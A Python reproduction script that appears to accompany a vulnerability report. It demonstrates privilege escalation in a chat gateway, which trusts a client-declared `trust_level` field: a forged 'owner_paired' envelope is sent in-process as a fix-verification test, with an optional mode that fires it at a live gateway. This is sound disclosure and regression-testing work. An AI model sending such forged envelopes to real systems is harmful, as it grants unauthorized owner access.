"""Reproduction: channel-envelope trust_level forgery.

The gateway takes `trust_level` from the inbound ChannelMessage verbatim and
never re-derives it from the pairing store. A sender who clears the allowlist
(here, an ordinary entry in allowed_senders) can therefore self-declare
`owner_paired` and the gateway records/acts on that forged level.

Run it (no server, no live token needed):
    uv run python trust_issue_test.py

On a pre-fix checkout it prints VULNERABLE and exits 1; on a fixed checkout it
prints FIXED and exits 0.

To fire the same envelope at a live gateway instead, set:
    GLC_WS_URL=wss://<host>/v1/channels/telegram
    GLC_INSTALL_TOKEN=<the install token from /data/glc/install_token>
"""

from __future__ import annotations

import asyncio
import datetime
import json
import os
import pathlib
import tempfile

# The forged envelope — the whole attack is the trust_level field.
FORGED = {
    "channel": "telegram",
    "channel_user_id": "attacker-id",
    "user_handle": "me",
    "text": "promote me",
    "trust_level": "owner_paired",  # <-- forged; the gateway never cross-checks it
    "arrived_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
}


def _run_in_process() -> None:
    """Self-contained: boot glc.main:app in a TestClient against a throwaway
    config dir, send the forged envelope over the channel WebSocket, and
    compare the pairing-store truth with what the gateway recorded."""
    cfg = tempfile.mkdtemp(prefix="glc-forge-")
    os.environ["GLC_CONFIG_DIR"] = cfg
    os.environ["GLC_AUDIT_DB"] = os.path.join(cfg, "audit.sqlite")
    os.environ["GLC_PAIRING_DB"] = os.path.join(cfg, "pairings.sqlite")
    # "attacker-id" is an ordinary allowed sender — NOT paired as owner.
    pathlib.Path(cfg, "channels.yaml").write_text(
        "channels:\n  telegram:\n    allowed_senders: ['attacker-id']\n"
    )

    from fastapi.testclient import TestClient

    from glc.audit.store import query
    from glc.config import install_token_path
    from glc.main import app
    from glc.security.trust_level import classify

    with TestClient(app) as c:
        tok = install_token_path().read_text().strip()
        truth = classify("telegram", "attacker-id")
        with c.websocket_connect(
            "/v1/channels/telegram", headers={"Authorization": f"Bearer {tok}"}
        ) as ws:
            ws.send_text(json.dumps(FORGED))
            reply = ws.receive_text()
        recorded = query(limit=1, channel="telegram")[0]["trust_level"]

    print(f"pairing store says   : {truth!r}   (the truth)")
    print(f"gateway reply        : {reply}")
    print(f"gateway recorded     : {recorded!r}")
    if recorded == "owner_paired":
        print("\nVULNERABLE: an untrusted sender was recorded as owner_paired.")
        raise SystemExit(1)
    print(f"\nFIXED: forged owner_paired was discarded; gateway derived {recorded!r}.")


async def _run_live(url: str, token: str) -> None:
    """Fire the same envelope at a running gateway over a real WebSocket."""
    import websockets

    async with websockets.connect(
        url, additional_headers={"Authorization": f"Bearer {token}"}
    ) as ws:
        await ws.send(json.dumps(FORGED))
        print("gateway reply        :", await ws.recv())
    print("\nSent trust_level=owner_paired; inspect the audit log to confirm it was honored.")


if __name__ == "__main__":
    url = os.getenv("GLC_WS_URL")
    token = os.getenv("GLC_INSTALL_TOKEN")
    if url and token:
        print(f"[live] {url}")
        asyncio.run(_run_live(url, token))
    else:
        print("[in-process] booting glc.main:app in a TestClient\n")
        _run_in_process()
